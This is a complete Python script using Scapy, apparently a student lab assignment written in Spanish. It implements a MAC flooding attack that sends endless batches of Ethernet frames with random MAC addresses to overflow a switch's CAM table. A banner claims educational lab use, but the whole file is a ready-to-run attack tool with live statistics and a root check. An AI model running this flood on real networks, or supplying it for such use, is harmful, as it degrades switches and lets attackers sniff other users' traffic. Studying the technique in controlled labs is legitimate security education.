#!/usr/bin/env python3
"""
MAC Flooding Attack - Matricula 2025-0719
"""
import os
import sys
import time
import signal
import random
import argparse
import threading

from scapy.all import Ether, sendp, conf, get_if_hwaddr

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║          MAC FLOODING TOOL  -  Matricula: 2025-0719          ║
║        SOLO PARA USO EDUCATIVO EN LABORATORIO CONTROLADO     ║
╚══════════════════════════════════════════════════════════════╝
{RESET}"""

packets_sent = 0
unique_macs  = set()
running      = True
start_time   = None


def signal_handler(sig, frame):
    global running
    running = False
    elapsed = time.time() - start_time if start_time else 0
    pps     = packets_sent / elapsed if elapsed > 0 else 0
    print(f"\n{GREEN}{'─'*50}")
    print(f"  RESUMEN MAC FLOODING")
    print(f"{'─'*50}")
    print(f"  Paquetes enviados  : {packets_sent:,}")
    print(f"  MACs unicas usadas : {len(unique_macs):,}")
    print(f"  Tiempo             : {elapsed:.1f}s")
    print(f"  Velocidad promedio : {pps:.0f} pkt/s")
    print(f"{'─'*50}{RESET}")
    sys.exit(0)


def random_mac():
    first = (random.randint(0, 127) * 2) | 0x02
    rest  = [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in [first] + rest)


def stats_printer():
    prev = 0
    while running:
        time.sleep(1)
        if not running:
            break
        elapsed = time.time() - start_time if start_time else 0
        delta   = packets_sent - prev
        print(f"{GREEN}[STATS]{RESET} "
              f"Paquetes: {packets_sent:>7,} | "
              f"MACs: {len(unique_macs):>6,} | "
              f"Vel: {delta:>5,} pkt/s | "
              f"Tiempo: {elapsed:>4.0f}s", end="\r")
        prev = packets_sent


def run_attack(iface, count, delay, verbose):
    global packets_sent, running, start_time

    conf.verb  = 0
    start_time = time.time()

    print(f"{CYAN}[*] Interfaz   : {iface}{RESET}")
    print(f"{CYAN}[*] MAC propia : {get_if_hwaddr(iface)}{RESET}")
    print(f"{CYAN}[*] Paquetes   : {'Infinito' if count == 0 else f'{count:,}'}{RESET}")
    print(f"{CYAN}[*] Tabla CAM tipica: 8,000 - 128,000 entradas{RESET}")
    print(f"\n{YELLOW}[*] Iniciando MAC Flooding... (Ctrl+C para detener){RESET}\n")

    t = threading.Thread(target=stats_printer, daemon=True)
    t.start()

    BATCH = 200
    try:
        while running:
            if count != 0 and packets_sent >= count:
                break

            pkts = []
            for _ in range(BATCH):
                src = random_mac()
                dst = random_mac()
                unique_macs.add(src)
                payload = bytes([random.randint(0, 255) for _ in range(64)])
                pkts.append(Ether(src=src, dst=dst) / payload)

            sendp(pkts, iface=iface, verbose=False)
            packets_sent += len(pkts)

            if delay > 0:
                time.sleep(delay)

    except PermissionError:
        print(f"\n{RED}[!] Requiere root{RESET}")
        sys.exit(1)
    except Exception as e:
        if running:
            print(f"\n{RED}[!] Error: {e}{RESET}")

    signal_handler(None, None)


def parse_args():
    parser = argparse.ArgumentParser(description="MAC Flooding - Matricula 2025-0719")
    parser.add_argument("-i", "--iface",   required=True,           help="Interfaz (ej: eth1)")
    parser.add_argument("-c", "--count",   type=int, default=0,     help="Paquetes (0=infinito)")
    parser.add_argument("-d", "--delay",   type=float, default=0,   help="Delay segundos")
    parser.add_argument("-v", "--verbose", action="store_true",     help="Modo verbose")
    return parser.parse_args()


if __name__ == "__main__":
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)

    if os.geteuid() != 0:
        print(f"{RED}[!] Requiere root: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

    args = parse_args()
    run_attack(args.iface, args.count, args.delay, args.verbose)
